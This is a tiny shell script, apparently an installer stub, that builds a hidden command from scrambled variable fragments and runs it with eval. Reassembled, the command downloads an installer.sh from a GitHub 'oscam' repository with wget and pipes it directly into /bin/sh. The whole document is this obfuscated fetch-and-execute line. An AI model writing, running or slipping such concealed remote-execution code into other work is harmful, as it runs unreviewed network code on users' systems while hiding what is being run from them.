z="
";Gz='serc';Vz='h';Dz='/raw';Jz='om/e';Nz='/mai';Hz='onte';Mz='scam';Pz='stal';Ez='.git';Uz='in/s';Oz='n/in';Kz='mil2';Lz='37/o';Cz='ps:/';Fz='hubu';Rz='sh -';Sz='O - ';Tz='| /b';Bz=' htt';Iz='nt.c';Qz='ler.';Az='wget';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"